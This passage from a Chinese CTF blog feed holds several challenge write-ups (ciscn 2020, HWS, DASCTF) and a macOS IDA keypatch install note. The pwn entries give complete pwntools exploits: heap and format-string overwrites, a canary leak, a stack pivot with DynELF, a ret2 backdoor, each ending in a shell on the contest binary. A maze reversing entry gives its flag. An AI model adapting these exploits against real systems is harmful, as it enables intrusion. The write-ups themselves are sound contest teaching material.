class="hljs-number">0x70</span>,payload)payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x6020C0</span> + <span class="hljs-number">0x100</span>)edit(<span class="hljs-number">1</span>,payload)payload = <span class="hljs-number">0x60</span> * <span class="hljs-string">'a'</span>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x70</span>,payload)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x90</span>,payload)payload = p64(<span class="hljs-number">0x0000000000602058</span>) + p64(<span class="hljs-number">0x90</span>)edit(<span class="hljs-number">0</span>,payload)edit(<span class="hljs-number">1</span>,p64(elf.plt[<span class="hljs-string">'printf'</span>]))sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)payload = <span class="hljs-string">'aaaa%7$s'</span> + p64(<span class="hljs-number">0x000000000602018</span>)sa(<span class="hljs-string">'idx'</span>,payload)r(<span class="hljs-number">4</span>)r(<span class="hljs-number">4</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - libc.sym[<span class="hljs-string">'puts'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)sys = libc_base + libc.sym[<span class="hljs-string">'system'</span>]sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)payload = <span class="hljs-string">'aaaa%82c'</span> + <span class="hljs-string">'%8$hhn11'</span> + p64(<span class="hljs-number">0x000000000602058</span>)sa(<span class="hljs-string">'idx'</span>,payload)edit(<span class="hljs-number">1</span>,p64(sys))s(<span class="hljs-string">'sh'</span>)itr()</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ciscn-2020初赛部分题目&quot;&gt;&lt;a href=&quot;#ciscn-2020初赛部分题目&quot; class=&quot;headerlink&quot; title=&quot;ciscn  2020初赛部分题目&quot;&gt;&lt;/a&gt;ciscn  2020初赛部分题目&lt;/h1&gt;&lt;h2 id=&quot;re&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>安恒HWS夏令营选拔赛部分题目</title>
    <link href="http://chumen77.xyz/2020/08/16/%E6%97%A0%E6%A0%87%E9%A2%98/"/>
    <id>http://chumen77.xyz/2020/08/16/无标题/</id>
    <published>2020-08-16T11:12:38.871Z</published>
    <updated>2020-08-17T13:55:03.167Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安恒HWS夏令营选拔赛部分题目"><a href="#安恒HWS夏令营选拔赛部分题目" class="headerlink" title="安恒HWS夏令营选拔赛部分题目"></a>安恒HWS夏令营选拔赛部分题目</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="IOT1"><a href="#IOT1" class="headerlink" title="IOT1"></a>IOT1</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>参考：<br><a href="https://www.cnblogs.com/csnd/p/11800622.html" target="_blank" rel="noopener">https://www.cnblogs.com/csnd/p/11800622.html</a></p><p>注意网卡那块，要对应自己虚拟机网卡的情况。</p><h5 id="启动命令："><a href="#启动命令：" class="headerlink" title="启动命令："></a>启动命令：</h5><div class="hljs"><pre><code class="hljs python">qemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append <span class="hljs-string">"root=/dev/sda console=tty50"</span>  -net nic -net tap</code></pre></div><h4 id="把虚拟机中要分析的maze文件取出来"><a href="#把虚拟机中要分析的maze文件取出来" class="headerlink" title="把虚拟机中要分析的maze文件取出来"></a>把虚拟机中要分析的maze文件取出来</h4><div class="hljs"><pre><code class="hljs bash">scp -r /path/maze username@servername:/path</code></pre></div><h4 id="使用ghidra进行分析"><a href="#使用ghidra进行分析" class="headerlink" title="使用ghidra进行分析"></a>使用ghidra进行分析</h4><div class="hljs"><pre><code class="hljs bash">fgets(buf,0x28,_stdin);len = strlen(buf);uStack68 = 0x20;<span class="hljs-keyword">if</span> (*(char *)((int)&amp;uStack68 + len + 3) == <span class="hljs-string">'\n'</span>) &#123;  *(undefined *)((int)&amp;uStack68 + len + 3) = 0;  len = len - 1;&#125;<span class="hljs-keyword">if</span> (len != 0x20) &#123;  eorr();&#125;</code></pre></div><p>这一段可以确定让输入的是32个字符。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_004006f0</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;  <span class="hljs-keyword">int</span> i;  <span class="hljs-keyword">int</span> j;    i = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> (i &lt; DAT_16) &#123;    j = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span> (j &lt; <span class="hljs-number">8</span>) &#123;      maze[i * <span class="hljs-number">8</span> + j] =           (<span class="hljs-keyword">char</span>)(((<span class="hljs-keyword">int</span>)s_AMz1nG~#--Ma7e~_00411034[i] &amp; *(uint *)(&amp;DAT_00411044 + j * <span class="hljs-number">4</span>)) &gt;&gt;                 (<span class="hljs-number">7U</span> - j &amp; <span class="hljs-number">0x1f</span>));      j = j + <span class="hljs-number">1</span>;    &#125;    i = i + <span class="hljs-number">1</span>;  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre></div><p>可以看到迷宫是在运行时根据部分数据，来生成的。并且其中一行是8个数据，一列是16个，一共128个数据。</p><p>可以使用gdb，断点在这个函数之后，把迷宫提取出来。提取出来的都是0x1 和 0x0<br>组成的迷宫。</p><p>进入控制走位的函数：</p><div class="hljs"><pre><code class="hljs c">heng = <span class="hljs-number">1</span>;shu = <span class="hljs-number">0</span>;pcStackX0 = param_1</code></pre></div><p>这个地方控制说，起先起点是第1行的第2个位置。</p><p>check函数，主要是看你是不是在移动后，走到了0上，走到的话，程序就判你失败。</p><p>往下看，发现主要判断：</p><div class="hljs"><pre><code class="hljs c">          <span class="hljs-keyword">if</span> (cVar1 != <span class="hljs-string">'U'</span>) &#123;LAB_00400ad4:            <span class="hljs-keyword">if</span> ((heng == <span class="hljs-number">1</span>) &amp;&amp; (shu == <span class="hljs-number">10</span>)) &#123;              uVar3 = <span class="hljs-number">1</span>;            &#125;            <span class="hljs-keyword">else</span> &#123;              uVar3 = <span class="hljs-number">0</span>;            &#125;</code></pre></div><p>在这一段，可以确定走到第11列的第2个数字即可。</p><h4 id="提取迷宫图并处理"><a href="#提取迷宫图并处理" class="headerlink" title="提取迷宫图并处理"></a>提取迷宫图并处理</h4><h5 id="脚本提取"><a href="#脚本提取" class="headerlink" title="脚本提取"></a>脚本提取</h5><div class="hljs"><pre><code class="hljs c">data=<span class="hljs-string">"AMz1nG~#--Ma7e~"</span>data2=[<span class="hljs-number">0x80</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x1</span>]maze=[]lie=<span class="hljs-number">0</span><span class="hljs-keyword">while</span> lie&lt;<span class="hljs-number">15</span>:    hang=<span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> hang&lt;<span class="hljs-number">8</span>:        # print(hex(ord(data[lie])&amp;data2[hang]),(<span class="hljs-number">7</span>-hang&amp;<span class="hljs-number">0x1f</span>))        maze.append((ord(data[lie])&amp;data2[hang])&gt;&gt;(<span class="hljs-number">7</span>-hang&amp;<span class="hljs-number">0x1f</span>))        hang+=<span class="hljs-number">1</span>    lie+=<span class="hljs-number">1</span>print(maze)</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/lAdA8H.png" srcset="/img/loading.gif" alt></p><p>就这迷宫，我看了好一会才能走好。🤣🤣服了自己，老以为是数据提取错了。</p><div class="hljs"><pre><code class="hljs bash">flag = md5&#123;DDRDDLDDRRRRRDRDDDDDLLDDLLLUUULU&#125;</code></pre></div><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="baby-canary"><a href="#baby-canary" class="headerlink" title="baby_canary_"></a><code>baby_canary_</code></h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><h5 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h5><ul><li>格式化字符串漏洞，可以用来泄漏。</li><li>栈溢出，只能1个gadget。</li></ul><h5 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h5><h6 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h6><p>只能溢出一个gadget，肯定是打栈迁移，但是跟以往的栈迁移不同的是，这一个gadget只能溢出到rbp，并不能覆盖到ret address，所以只能覆盖好rbp后，利用程序走出这个函数后，将要结束程序时的<code>leave ret</code> 。</p><p>但是需要注意的是因为在走过一次 <code>leave ret</code>时，此时的rbp已经被改了，再过程序的第二个leave ret 前，需要过一下canary的检测:</p><div class="hljs"><pre><code class="hljs bash">[----------------------------------registers-----------------------------------]RAX: 0x0RBX: 0x0RCX: 0x0RDX: 0x38 (<span class="hljs-string">'8'</span>)RSI: 0x7ffefee5e310 --&gt; 0x26c46b053d3e2f00RDI: 0x0RBP: 0x601198 --&gt; 0x26c46b053d3e2f00RSP: 0x7ffefee5e350 --&gt; 0x7ffefee5e440 --&gt; 0x1RIP: 0x4008de (mov    rdx,QWORD PTR [rbp-0x8])R8 : 0x7f0bb0977700 (0x00007f0bb0977700)R9 : 0x12R10: 0x78 (<span class="hljs-string">'x'</span>)R11: 0x246R12: 0x400680 (xor    ebp,ebp)R13: 0x7ffefee5e440 --&gt; 0x1R14: 0x0R15: 0x0EFLAGS: 0x246 (carry PARITY adjust ZERO sign <span class="hljs-built_in">trap</span> INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]   0x4008cf:    mov    eax,0x0   0x4008d4:    call   0x4007de   0x4008d9:    mov    eax,0x0=&gt; 0x4008de:    mov    rdx,QWORD PTR [rbp-0x8]   0x4008e2:    xor    rdx,QWORD PTR fs:0x28   0x4008eb:    je     0x4008f2   0x4008ed:    call   0x400600 &lt;__stack_chk_fail@plt&gt;</code></pre></div><p>看这里，在取数值时，其在你迁移的bss段读取数值到rdx进行判断的，所以在第一次往bss段读的时候，填充好canary的值。</p><p>并且这个题，在看got表到bss段的距离也是很近的。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/zbOm9Q.png" srcset="/img/loading.gif" alt></p><p>所以在迁移的时候需要注意，从有实际意义的函数（比如puts）开始前就得把栈抬高。否则在进入libc的内部调用函数时，会因为各种push pop 而修改到got处的东西，导致不仅泄漏的数值有问题，并且容易让程序崩掉。</p><div class="hljs"><pre><code class="hljs bash">payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)s.sendafter(<span class="hljs-string">"canary ' s 5 0 n g :"</span>,payload)payload = p64(canary)*6+p64(bss+0x100-8)s.sendafter(<span class="hljs-string">"canary ' s h 0 m e :"</span>,payload)s.recvline()puts = u64(s.recv(6).ljust(8,<span class="hljs-string">'\x00'</span>))success(hex(puts))s.recvline()</code></pre></div><p>此处就可以泄漏出puts函数的libc地址，但是由于出题人想考察<code>ret2dl_runtime_resolve</code>,所以应该是魔改了libc。</p><p>然后可以使用DynELF来搞定，参考群里师傅分享的exp。</p><h6 id="Dynelf函数怎么写"><a href="#Dynelf函数怎么写" class="headerlink" title="Dynelf函数怎么写"></a>Dynelf函数怎么写</h6><p>由于程序只有puts函数来输出，就用puts函数来进行泄漏。</p><div class="hljs"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">57</span> +p64(canary) * <span class="hljs-number">2</span>  +p64(pop_rdi)+p64(address)+p64(puts_plt)+ p64(start_addr)</code></pre></div><p>本来我是这样写的，但是发现程序还是会崩，由于程序情况的限制，栈只能提高<code>0x1b0</code>这样，还是不够用。</p><p>还是就想办法提升栈，往高点的bss上写入rop进行想要的操作。</p><p>这个就在Dynelf前写好,用rop控制参数，调用read函数来往高点的bss段进行写payload，并且最后用pop rsp的操作，把写好rop chain的bss的地址pop 到rsp上，然后再ret上去：</p><div class="hljs"><pre><code class="hljs python">payload = p64(canary)*(<span class="hljs-number">0x100</span>/<span class="hljs-number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)payload += p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x500</span>)+p64(<span class="hljs-number">0</span>)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+<span class="hljs-number">0x500</span><span class="hljs-number">-8</span>*<span class="hljs-number">3</span>)+<span class="hljs-string">"/bin/sh\x00"</span>s.sendafter(<span class="hljs-string">"canary ' s 5 0 n g :"</span>,payload)payload = p64(canary)*<span class="hljs-number">6</span>+p64(bss+<span class="hljs-number">0x100</span><span class="hljs-number">-8</span>)s.sendafter(<span class="hljs-string">"canary ' s h 0 m e :"</span>,payload)s.recvline()</code></pre></div><p>接着就是用这写好好的rop chain，进行泄漏地址，为了Dynelf多次调用泄漏，在泄漏地址后，跟上read函数继续往这段地址上读取同样的rop chain，然后再次控制rsp，接着ret到对应的位置：</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vuln</span><span class="hljs-params">(address)</span>:</span>    payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)    payload += p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x500</span>)+p64(<span class="hljs-number">0</span>) + \                   p64(read_plt)+p64(pop_rsp_3)+p64(<span class="hljs-number">0x6015a0</span><span class="hljs-number">-8</span>*<span class="hljs-number">3</span>)    s.recvline(timeout=<span class="hljs-number">0.07</span>)    s.send(payload)    count = <span class="hljs-number">0</span>    up = <span class="hljs-string">""</span>    buf = <span class="hljs-string">''</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        c = s.recv(numb=<span class="hljs-number">1</span>, timeout=<span class="hljs-number">0.07</span>)        count += <span class="hljs-number">1</span>        <span class="hljs-keyword">if</span> up == <span class="hljs-string">'\n'</span> <span class="hljs-keyword">and</span> c == <span class="hljs-string">""</span>:              buf = buf[:<span class="hljs-number">-1</span>]                        buf += <span class="hljs-string">"\x00"</span>            <span class="hljs-keyword">break</span>        <span class="hljs-keyword">else</span>:            buf += c            up = c    data = buf[:<span class="hljs-number">8</span>]    log.debug(<span class="hljs-string">"%#x =&gt; %s"</span> % (address, (data <span class="hljs-keyword">or</span> <span class="hljs-string">''</span>).encode(<span class="hljs-string">'hex'</span>)))    <span class="hljs-keyword">return</span> data</code></pre></div><p>可以看到是提高了0x500个字节的地方进行rop，做好用控制rsp，ret后进行反复横跳跃，完成对system 的寻找。感觉这是很好的办法，因为栈迁移的核心还是控制rsp，最初学习是见过2次栈迁移的题目，当时用的还是leave ret 来进行的控制，现在看到直接使用pop rsp 来控制，的确是方便又简单的办法。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-comment"># from LibcSearcher import *</span>s = process(<span class="hljs-string">"./pwn"</span>)<span class="hljs-comment"># s = remote("183.129.189.61",54900)</span>libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)elf = ELF(<span class="hljs-string">"./pwn"</span>)context.log_level=<span class="hljs-string">'debug'</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(s)[0],gdbscript='b main')</span>    gdb.attach(s)    pause()pop_rdi = <span class="hljs-number">0x0000000000400963</span>pop_rsi_r15 = <span class="hljs-number">0x0000000000400961</span>pop_rsp_3 = <span class="hljs-number">0x000000000040095d</span>leave_ret = <span class="hljs-number">0x00000000004007dc</span>context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]puts_got = elf.got[<span class="hljs-string">'puts'</span>]read_plt = elf.plt[<span class="hljs-string">'read'</span>]bss = <span class="hljs-number">0x6010a0</span>s.sendafter(<span class="hljs-string">"canary ' s @ # $ % ^ &amp; * :\n"</span>, <span class="hljs-string">"%9$p"</span>)canary = int(s.recvline(keepends=<span class="hljs-literal">False</span>), <span class="hljs-number">16</span>)success(hex(canary))context.arch = <span class="hljs-string">'amd64'</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vuln</span><span class="hljs-params">(address)</span>:</span>    payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)    payload += p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x500</span>)+p64(<span class="hljs-number">0</span>) + \                   p64(read_plt)+p64(pop_rsp_3)+p64(<span class="hljs-number">0x6015a0</span><span class="hljs-number">-8</span>*<span class="hljs-number">3</span>)    s.recvline(timeout=<span class="hljs-number">0.07</span>)    s.send(payload)    count = <span class="hljs-number">0</span>    up = <span class="hljs-string">""</span>    buf = <span class="hljs-string">''</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        c = s.recv(numb=<span class="hljs-number">1</span>, timeout=<span class="hljs-number">0.07</span>)        count += <span class="hljs-number">1</span>        <span class="hljs-keyword">if</span> up == <span class="hljs-string">'\n'</span> <span class="hljs-keyword">and</span> c == <span class="hljs-string">""</span>:              buf = buf[:<span class="hljs-number">-1</span>]                        buf += <span class="hljs-string">"\x00"</span>            <span class="hljs-keyword">break</span>        <span class="hljs-keyword">else</span>:            buf += c            up = c    data = buf[:<span class="hljs-number">8</span>]    log.debug(<span class="hljs-string">"%#x =&gt; %s"</span> % (address, (data <span class="hljs-keyword">or</span> <span class="hljs-string">''</span>).encode(<span class="hljs-string">'hex'</span>)))    <span class="hljs-keyword">return</span> datadebug()payload = p64(canary)*(<span class="hljs-number">0x100</span>/<span class="hljs-number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)payload += p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x500</span>)+p64(<span class="hljs-number">0</span>)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+<span class="hljs-number">0x500</span><span class="hljs-number">-8</span>*<span class="hljs-number">3</span>)+<span class="hljs-string">"/bin/sh\x00"</span>s.sendafter(<span class="hljs-string">"canary ' s 5 0 n g :"</span>,payload)payload = p64(canary)*<span class="hljs-number">6</span>+p64(bss+<span class="hljs-number">0x100</span><span class="hljs-number">-8</span>)s.sendafter(<span class="hljs-string">"canary ' s h 0 m e :"</span>,payload)s.recvline()puts = u64(s.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))success(hex(puts))s.recvline()d = DynELF(vuln,elf=elf)system = d.lookup(<span class="hljs-string">'system'</span>,<span class="hljs-string">'libc'</span>)success(hex(system))payload = p64(pop_rdi)+p64(<span class="hljs-number">0x6010a0</span>+<span class="hljs-number">0x100</span>+<span class="hljs-number">8</span>*<span class="hljs-number">11</span>)+p64(system)s.send(payload)s.interactive()</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安恒HWS夏令营选拔赛部分题目&quot;&gt;&lt;a href=&quot;#安恒HWS夏令营选拔赛部分题目&quot; class=&quot;headerlink&quot; title=&quot;安恒HWS夏令营选拔赛部分题目&quot;&gt;&lt;/a&gt;安恒HWS夏令营选拔赛部分题目&lt;/h1&gt;&lt;h2 id=&quot;RE&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="IOT" scheme="http://chumen77.xyz/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>MacOS安装IDA插件keypatch</title>
    <link href="http://chumen77.xyz/2020/08/10/MacOS%E5%AE%89%E8%A3%85IDA%E6%8F%92%E4%BB%B6keypatch/"/>
    <id>http://chumen77.xyz/2020/08/10/MacOS安装IDA插件keypatch/</id>
    <published>2020-08-10T09:23:15.104Z</published>
    <updated>2020-08-10T15:11:27.782Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MacOS安装IDA插件keypatch"><a href="#MacOS安装IDA插件keypatch" class="headerlink" title="MacOS安装IDA插件keypatch"></a>MacOS安装IDA插件keypatch</h1><p>macOS 安装官方介绍的安装方式不太行。网上参考后记录一下。</p><h2 id="cmake"><a href="#cmake" class="headerlink" title="cmake"></a>cmake</h2><div class="hljs"><pre><code class="hljs bash">brew install cmake</code></pre></div><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><div class="hljs"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/fjh658/keystone-engine.git<span class="hljs-built_in">cd</span> keystone-enginegit submodule update --init --recursivesudo python2 setup.py install --verbose</code></pre></div><p>此时在安装后的最后几段代码中，找到类似：</p><div class="hljs"><pre><code class="hljs bash">/Library/Python/2.7/site-packages/keystone</code></pre></div><p>这是本地python2.7的路径。</p><h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><div class="hljs"><pre><code class="hljs bash">cp -r /Library/Python/2.7/site-packages/keystone /Applications/IDA\ Pro\ 7.0/ida.app/Contents/MacOS/python/lib/python2.7/lib-dynload/</code></pre></div><div class="hljs"><pre><code class="hljs bash">sudo  curl -L https://raw.githubusercontent.com/keystone-engine/keypatch/master/keypatch.py &gt; keypatch.py</code></pre></div><p>现实拒绝的话，可以</p><div class="hljs"><pre><code class="hljs bash">vim /etc/hosts199.232.68.133 raw.githubusercontent.com</code></pre></div><div class="hljs"><pre><code class="hljs bash">cp -r ./keypatch.py /Applications/IDA\ Pro\ 7.0/ida64.app/Contents/MacOS/plugins/cp -r ./keypatch.py /Applications/IDA\ Pro\ 7.0/ida.app/Contents/MacOS/plugins/</code></pre></div><p>然后进入ida使用即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MacOS安装IDA插件keypatch&quot;&gt;&lt;a href=&quot;#MacOS安装IDA插件keypatch&quot; class=&quot;headerlink&quot; title=&quot;MacOS安装IDA插件keypatch&quot;&gt;&lt;/a&gt;MacOS安装IDA插件keypatch&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="杂项" scheme="http://chumen77.xyz/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF安恒月赛(7th)</title>
    <link href="http://chumen77.xyz/2020/07/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(7th)/"/>
    <id>http://chumen77.xyz/2020/07/25/DASCTF安恒月赛(7th)/</id>
    <published>2020-07-25T13:50:36.163Z</published>
    <updated>2020-08-10T03:50:16.610Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTF安恒月赛-7th"><a href="#DASCTF安恒月赛-7th" class="headerlink" title="DASCTF安恒月赛(7th)"></a>DASCTF安恒月赛(7th)</h1><p>只做出个签到题，tcl。。。</p><h2 id="虚假的签到题"><a href="#虚假的签到题" class="headerlink" title="虚假的签到题"></a>虚假的签到题</h2><p>简单的栈溢出，但是出题人估计是用了GCC&gt;=4.9版本，故意给这个Stack Buffer Overflow 设置难度。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0x80485fd</span> &lt;main+<span class="hljs-number">104</span>&gt;:        <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4</span>]<span class="hljs-number">0x8048600</span> &lt;main+<span class="hljs-number">107</span>&gt;:        <span class="hljs-keyword">leave</span><span class="hljs-number">0x8048601</span> &lt;main+<span class="hljs-number">108</span>&gt;:        <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">esp</span>,[<span class="hljs-built_in">ecx</span>-<span class="hljs-number">0x4</span>]<span class="hljs-number">0x8048604</span> &lt;main+<span class="hljs-number">111</span>&gt;:        <span class="hljs-keyword">ret</span></code></pre></div><p>这里我们可以看到，程序在对栈的保存上，额外使用了 ecx 来保存栈上的某个值。并且调试可以发现，如果我们直接overflow了 esp，那么会造成奇怪的影响。</p><p>试着分析一下：</p><ul><li>想要控制esp，就得控制ecx</li><li>想要控制ecx，就得至少控制到ebp-0x4的位置</li></ul><p>由于是gets的获取输入，这个明显很容易实现。</p><p>核心就是让：</p><div class="hljs"><pre><code class="hljs undefined">[ [ebp<span class="hljs-number">-0x4</span>] - <span class="hljs-number">0x4</span>] = address(backdoor)</code></pre></div><p>附上成功时栈情况,断点在0x80485fd ：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/cIBzn5.png" srcset="/img/loading.gif" alt></p><p>由于栈随机化，其中需要用格式化字符串漏洞泄漏<code>[ebp-0x4]</code>，来获取在<br>ebp-0x4的位置填入什么值合适，从而完成攻击。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./qiandao'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'183.129.189.60'</span>,<span class="hljs-number">10013</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()one = <span class="hljs-number">0x804857D</span><span class="hljs-comment"># debug()</span>payload = <span class="hljs-string">'%13$p'</span>sla(<span class="hljs-string">'name'</span>,payload)ru(<span class="hljs-string">'0x'</span>)key = int(r(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x40</span> + <span class="hljs-number">0x8</span>info_addr(<span class="hljs-string">'key'</span>,key)payload = p32(one)*<span class="hljs-number">9</span> + p32(key)sla(<span class="hljs-string">"?"</span>,payload)itr()</code></pre></div><p>多调试，会更容易理解。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DASCTF安恒月赛-7th&quot;&gt;&lt;a href=&quot;#DASCTF安恒月赛-7th&quot; class=&quot;headerlink&quot; title=&quot;DASCTF安恒月赛(7th)&quot;&gt;&lt;/a&gt;DASCTF安恒月赛(7th)&lt;/h1&gt;&lt;p&gt;只做出个签到题，tcl。。。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF暑假刷题(1)</title>
    <link href="http://chumen77.xyz/2020/07/10/BUUCTF%E6%9A%91%E5%81%87%E5%88%B7%E9%A2%98/"/>
    <id>http://chumen77.xyz/2020/07/10/BUUCTF暑假刷题/</id>
    <published>2020-07-10T13:16:13.644Z</published>
    <updated>2020-10-10T12:21:34.242Z</updated>
    
